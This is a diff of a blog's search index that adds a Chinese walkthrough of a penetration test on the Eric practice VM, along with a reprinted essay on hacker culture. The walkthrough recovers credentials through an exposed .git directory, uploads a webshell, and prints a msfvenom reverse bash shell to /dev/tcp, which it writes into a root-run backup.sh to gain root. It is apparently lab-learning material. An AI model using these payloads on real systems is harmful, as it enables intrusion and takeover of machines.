@@ -4,6 +4,33 @@
   
     
     <entry>
+      <title>Eric靶机渗透测试总结</title>
+      <link href="/2019/12/07/2019-eric-shen-tou-ce-shi-zong-jie/"/>
+      <url>/2019/12/07/2019-eric-shen-tou-ce-shi-zong-jie/</url>
+      
+        <content type="html"><![CDATA[<h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><p>直接将下载好的eric靶机文件使用vbox虚拟机导入，</p><p>问题：</p><p>由于我的 <u>kail</u> 是装在<u>vmare</u>中的，所以如果选择<u>nat</u> 模式的网络连接是没办法访问到<u>vbox</u>中的虚拟机的，因为两个不同的虚拟机软件使用的是两个<u>nat</u>网络。 </p><p>解决方法：</p><p>将两个虚拟机的网络连接模式都选择桥接模式，桥接到同一网卡即可，注意此时电脑的网络不能使用联通校园网，否则无法进行网卡桥接，手机开个热点就行了。</p><h1 id="预备知识"><a href="#预备知识" class="headerlink" title="预备知识"></a>预备知识</h1><h2 id="netdiscover-用法"><a href="#netdiscover-用法" class="headerlink" title="netdiscover  用法"></a>netdiscover  用法</h2><pre><code>-i device: your network device-r range: scan a given range instead of auto scan. 192.168.6.0/24,/16,/8-l file: scan the list of ranges contained into the given file-p passive mode: do not send anything, only sniff-m file: scan a list of known MACs and host names-F filter: customize pcap filter expression (default: &quot;arp&quot;)-s time: time to sleep between each ARP request (milliseconds)-c count: number of times to send each ARP request (for nets with packet loss)-n node: last source IP octet used for scanning (from 2 to 253)-d ignore home config files for autoscan and fast mode-f enable fastmode scan, saves a lot of time, recommended for auto-P print results in a format suitable for parsing by another program and stop after active scan-L similar to -P but continue listening after the active scan is completed-N Do not print header. Only valid when -P or -L is enabled.-S enable sleep time suppression between each request (hardcore mode)</code></pre><p><strong>举例：</strong></p><pre><code>root@kail:~# netdiscover -i eth0 -r 192.168.43.0/24</code></pre><p>-i是指定网卡  -r是指定ip地址的范围</p><h2 id="dirbuster-目录爆破"><a href="#dirbuster-目录爆破" class="headerlink" title="dirbuster 目录爆破"></a>dirbuster 目录爆破</h2><p>开启命令</p><pre><code>root@kail:~# dirbuster </code></pre><p>kail 自带的爆破列表所在位置：</p><pre><code>/usr/share/wordlists/</code></pre><h2 id="nmap-初步"><a href="#nmap-初步" class="headerlink" title="nmap 初步"></a>nmap 初步</h2><ul><li><p>扫描主机开放端口</p><p>nmap 192.168.1.1</p></li><li><p>查看是否开放某一端口</p><p>nmap -p 8080 192.168.1.1</p><p>同时查询多个端口</p><p>nmap  -p 22,21,80 192.168.31.13</p><p>查询多个网段</p><p>nmap  -p 22,21,80 192.168.31.1-253</p><p>扫描整个子网</p><p>nmap 192.168.31.1/24 </p></li><li><p>强力模式</p><p>nmap -A 192.168.0.1</p></li></ul><h2 id="msfvenom-生成脚本"><a href="#msfvenom-生成脚本" class="headerlink" title="msfvenom 生成脚本"></a>msfvenom 生成脚本</h2><p><a href="https://www.cnblogs.com/ScriptKid-Lu/p/10559563.html" target="_blank" rel="noopener">博主总结</a></p><h1 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h3><pre><code>root@kail:~# netdiscover -i eth0 -r 192.168.43.0/24 Currently scanning: Finished!   |   Screen View: Unique Hosts                                                                                                                 32 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 1920                                      _____________________________________________________________________________   IP            At MAC Address     Count     Len  MAC Vendor / Hostname       ----------------------------------------------------------------------------- 192.168.43.76   08:00:27:fe:19:1e      2     120  PCS Systemtechnik GmbH                               192.168.43.95   e4:a7:c5:c5:f6:ef     28    1680  HUAWEI TECHNOLOGIES CO.,LTD                          192.168.43.146  b8:08:cf:96:f6:0e      2     120  Intel Corporate                                     [14]+  已停止               netdiscover -i eth0 -r 192.168.43.0/24</code></pre><p>192.168.43.76 即为 eric 靶机的ip</p><h3 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h3><ul><li><p>nmap 扫描主机开放的所有端口</p><p><img src="https://pic1.superbed.cn/item/5de91065f1f6f81c50d848e7.jpg" alt></p><p>发现开放了80端口，尝试访问</p><p><img src="https://pic3.superbed.cn/item/5de910bcf1f6f81c50d8598f.jpg" alt></p><p>发现是一个还未建设完毕的博客。</p></li><li><p>使用<strong>dirbuster</strong>进行目录爆破。</p><pre><code>root@kail:~# dirbuster </code></pre><p><img src="C:%5CUsers%5CMAIBENBEN%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1575557516150.png" alt="1575557516150"></p><p><img src="https://pic3.superbed.cn/item/5de9193bf1f6f81c50d9fe64.jpg" alt></p><p>发现了 admin.php, 尝试访问。</p><p><img src="https://pic1.superbed.cn/item/5de91ac0f1f6f81c50da4010.jpg" alt></p><p>得到一个登录页面，随意输入用户名和密码，结果，返回提示我们不要尝试进行弱口令爆破了。</p><p>Wrong username and/or password. Don’t even bother bruteforcing.</p></li><li><p>使用nmap 强力模式进行扫描，得到扫描结果</p><p><img src="https://pic1.superbed.cn/item/5dea180ef1f6f81c50041041.jpg" alt></p><p>发现存在 .git  泄露漏洞。</p></li></ul><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>使用 GitHack 工具可以利用 .git 漏洞对网站的工程文件重建。</p><p><img src="https://pic.superbed.cn/item/5dea430df1f6f81c500d710c.jpg" alt></p><p>查看获取到的文件，在admin.php 里面发现账户密码</p><p><img src="https://pic3.superbed.cn/item/5dea45b2f1f6f81c500dfdf2.jpg" alt></p><p>这密码怎么可能爆破出来,emmmmm-</p><p>使用找的的密码进行登录，得到</p><p><img src="https://pic.superbed.cn/item/5dea4a0bf1f6f81c500ec799.jpg" alt></p><p>上传后门文件。</p><p><img src="https://pic.superbed.cn/item/5dea56def1f6f81c50121c89.jpg" alt></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><ul><li><p>反向shell</p><p>在kail 上创建nc 监听。</p><p>​    root@kail:~# nc -lnvp 1234</p><p>访问我们上传的大马，找到network 中的 Reverse Shell 填入我们kail 的 ip, , run  一下</p><p><a href="http://192.168.43.76/upload/nosafe.php#!network" target="_blank" rel="noopener">http://192.168.43.76/upload/nosafe.php#!network</a></p><p>连接成功</p><p><img src="https://pic.superbed.cn/item/5dea604bf1f6f81c50143d28.jpg" alt></p></li><li><p>提权</p><p>尝试 </p><pre><code>/var/www&gt;cd ~/bin/sh: 3: cd: can&#39;t cd to ~</code></pre><p>我们没有root权限，不能查看根目录。</p><p>尝试提权</p><p><img src="https://pic2.superbed.cn/item/5dea62baf1f6f81c5014b79f.jpg" alt></p><p>找到了home 文件夹，发现了一个flag.txt, 可是此时要求的是root/flag.txt 这个文件显然路径不对。</p><p>我们发现了backup.sh, 该文件我们呢有完全的读写权限，而且该文件还拥有root权限，所以可以尝试更改此文件，从而获取到root权限。</p><p>查看该文件，发现是一个将网站文件进行打包压缩的命令</p><p>生成反向shell脚本</p><pre><code>root@kail:~# msfvenom -p cmd/unix/reverse_bash lhost=192.168.43.147 lport=4455 R[-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload[-] No arch selected, selecting arch: cmd from the payloadNo encoder or badchars specified, outputting raw payloadPayload size: 68 bytes0&lt;&amp;154-;exec 154&lt;&gt;/dev/tcp/192.168.43.147/4455;sh &lt;&amp;154 &gt;&amp;154 2&gt;&amp;154</code></pre><p>写入 backup.sh</p><pre><code>/home/eric&gt;echo &quot;0&lt;&amp;154-;exec 154&lt;&gt;/dev/tcp/192.168.43.147/4455;sh &lt;&amp;154 &gt;&amp;154 2&gt;&amp;154&quot;&gt; backup.sh</code></pre><p>创建另一个监听端口，运行backup.shell</p><p><img src="https://pic1.superbed.cn/item/5dea7d78f1f6f81c5019b7ed.jpg" alt></p><p>得到最终的flag。</p></li></ul><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol><li>主机发现</li><li>漏洞发现</li><li>漏洞利用</li><li>提权</li></ol>]]></content>
+      
+      
+      <categories>
+          
+          <category> 网络安全 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> web </tag>
+            
+            <tag> 渗透测试 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>文件上传漏洞总结</title>
       <link href="/2019/11/25/2019-wen-jian-shang-chuan-lou-dong/"/>
       <url>/2019/11/25/2019-wen-jian-shang-chuan-lou-dong/</url>
@@ -58,6 +85,25 @@
     
     
     <entry>
+      <title>凤凰挽歌，黑客独白</title>
+      <link href="/2019/09/25/2019-feng-huang-wan-ge-hei-ke-du-bai/"/>
+      <url>/2019/09/25/2019-feng-huang-wan-ge-hei-ke-du-bai/</url>
+      
+        <content type="html"><![CDATA[<p><strong>这是一片很早转载自《黑客x档案》的一篇文章，是一篇影响我很深的文章，这个杂志已经停刊了，在博客中置顶表达我的敬意。</strong></p><p>还记得当年的5月1日—5月7日吗？美国黑客组织PoisonBox、Prophet、Hi-Tech等，对中国发动了来自网络的攻击，为了捍卫祖国和民族的尊严，中国的黑客也进行了奋力还击，当看到美国白宫网站被挂上五星红旗，所有的爱国人士无不拍手称快。</p><p>时至今日，我国的网络信息产业也得到了飞速的发展。在发展的同时，中国黑客，这一特殊的黑客群体也在茁壮成长着，从最初的“绿色兵团”到各大黑客组织的成立，中国的黑客一次又一次在捍卫祖国尊严的网络战场上展现了独一无二的魅力。</p><p>黑客本身并不是贬义词，他们由于拥有高超的计算机水平、神出鬼没的行踪，使得人们对他们的映像大多是“神秘、高超”等。其实黑客并没有一个完整的定义，不过就现在的信息安全发展来看，黑客应该具备以下技能：精通计算机各项操作、能熟练使用各种工具并了解其原理、有高超的编程（汇编等）技术、又冷静沉着的心理素质、善于和别的黑客交流等等。由于其技术和道德品质的不同，黑客往往被分为两类：黑客和伪黑客（骇客）。</p><p>有人将黑客比喻成药，在治愈疾病的同时也会带来副作用。黑客精神，是一种自由与共享，是深陷困境却寻求突破与解脱的追求，这是每一个走进黑客世界的人所向往的境界。但现今的社会，开始走向和平与稳定，这使得一些黑客失去了文争武斗的舞台。老一辈的黑客由于年纪较大，开始了“宅人”生活，他们大多以安全顾问以及安全公司的身份出现在网络中。</p><p>在这样的背景下一群年轻人怀着对祖国的热爱核对黑客神秘的崇拜，开始了他们的追求，但跟多的则是沉迷于雕虫小技的卖弄，掉进了黑色经济的大染缸里……从打着“爱国主义”旗号、“保护自己信息安全”等旗号的伪黑客培训班到公开贩卖的所谓的“顶级”黑客工具。</p><p>传统的黑客已近不多了，千百个网络流氓跳出来。利用拒绝服务攻击、盗号等手段进行敲诈、倒卖的“黑金效应”，湿的渴求利用黑客技术技术一夜暴富的流氓蜂拥而至。由于互联网本身的脆弱性和网络服务提供商的漏洞，使得这类黑色经济疯狂的滋长着。<br>一些注重自我得失而敢于铤而走险的年轻人，他们不再愤怒晋国神社扭曲历史，各大色情、赌博网站成了他们的聚居地，他们打着复制、抄袭、改写等“创新”而四处出击，各类程序上都留下了作者和联系方式，他们不再羞羞答答，而是唯恐天下不知的到处叫卖着自己所谓的作品。<br>黑客那种侠义的精神也许会在这些年轻人中间消失，他们跟多看中的是金钱、名誉、地位……他们忘记了当初自己为什么走进了黑客这个圈子，也许他们只是为了那些虚无的东西，技术只是让他们名利双收的工具罢了。<br>让我们带上耳机，听听那首《黑客独白》熟悉的旋律吧，为失去理想的黑客唱一首挽歌吧：</p><pre><code>世界总是说你说我，难道就因为，我可以直接敲打他的心窝。黑夜也是生活，黑夜白天也一样过。不要说我是什么黑客，就因为我的黑夜比白天多......</code></pre>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> 心情 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>攻防世界web进阶</title>
       <link href="/2019/09/25/2019-gong-fang-shi-jie-web-jin-jie/"/>
       <url>/2019/09/25/2019-gong-fang-shi-jie-web-jin-jie/</url>
@@ -79,25 +125,6 @@
             <tag> CTF </tag>
             
             <tag> 竞赛 </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>凤凰挽歌，黑客独白</title>
-      <link href="/2019/09/25/2019-feng-huang-wan-ge-hei-ke-du-bai/"/>
-      <url>/2019/09/25/2019-feng-huang-wan-ge-hei-ke-du-bai/</url>
-      
-        <content type="html"><![CDATA[<p><strong>这是一片很早转载自《黑客x档案》的一篇文章，是一篇影响我很深的文章，这个杂志已经停刊了，在博客中置顶表达我的敬意。</strong></p><p>还记得当年的5月1日—5月7日吗？美国黑客组织PoisonBox、Prophet、Hi-Tech等，对中国发动了来自网络的攻击，为了捍卫祖国和民族的尊严，中国的黑客也进行了奋力还击，当看到美国白宫网站被挂上五星红旗，所有的爱国人士无不拍手称快。</p><p>时至今日，我国的网络信息产业也得到了飞速的发展。在发展的同时，中国黑客，这一特殊的黑客群体也在茁壮成长着，从最初的“绿色兵团”到各大黑客组织的成立，中国的黑客一次又一次在捍卫祖国尊严的网络战场上展现了独一无二的魅力。</p><p>黑客本身并不是贬义词，他们由于拥有高超的计算机水平、神出鬼没的行踪，使得人们对他们的映像大多是“神秘、高超”等。其实黑客并没有一个完整的定义，不过就现在的信息安全发展来看，黑客应该具备以下技能：精通计算机各项操作、能熟练使用各种工具并了解其原理、有高超的编程（汇编等）技术、又冷静沉着的心理素质、善于和别的黑客交流等等。由于其技术和道德品质的不同，黑客往往被分为两类：黑客和伪黑客（骇客）。</p><p>有人将黑客比喻成药，在治愈疾病的同时也会带来副作用。黑客精神，是一种自由与共享，是深陷困境却寻求突破与解脱的追求，这是每一个走进黑客世界的人所向往的境界。但现今的社会，开始走向和平与稳定，这使得一些黑客失去了文争武斗的舞台。老一辈的黑客由于年纪较大，开始了“宅人”生活，他们大多以安全顾问以及安全公司的身份出现在网络中。</p><p>在这样的背景下一群年轻人怀着对祖国的热爱核对黑客神秘的崇拜，开始了他们的追求，但跟多的则是沉迷于雕虫小技的卖弄，掉进了黑色经济的大染缸里……从打着“爱国主义”旗号、“保护自己信息安全”等旗号的伪黑客培训班到公开贩卖的所谓的“顶级”黑客工具。</p><p>传统的黑客已近不多了，千百个网络流氓跳出来。利用拒绝服务攻击、盗号等手段进行敲诈、倒卖的“黑金效应”，湿的渴求利用黑客技术技术一夜暴富的流氓蜂拥而至。由于互联网本身的脆弱性和网络服务提供商的漏洞，使得这类黑色经济疯狂的滋长着。<br>一些注重自我得失而敢于铤而走险的年轻人，他们不再愤怒晋国神社扭曲历史，各大色情、赌博网站成了他们的聚居地，他们打着复制、抄袭、改写等“创新”而四处出击，各类程序上都留下了作者和联系方式，他们不再羞羞答答，而是唯恐天下不知的到处叫卖着自己所谓的作品。<br>黑客那种侠义的精神也许会在这些年轻人中间消失，他们跟多看中的是金钱、名誉、地位……他们忘记了当初自己为什么走进了黑客这个圈子，也许他们只是为了那些虚无的东西，技术只是让他们名利双收的工具罢了。<br>让我们带上耳机，听听那首《黑客独白》熟悉的旋律吧，为失去理想的黑客唱一首挽歌吧：</p><pre><code>世界总是说你说我，难道就因为，我可以直接敲打他的心窝。黑夜也是生活，黑夜白天也一样过。不要说我是什么黑客，就因为我的黑夜比白天多......</code></pre>]]></content>
-      
-      
-      
-        <tags>
-            
-            <tag> 心情 </tag>
             
         </tags>
       
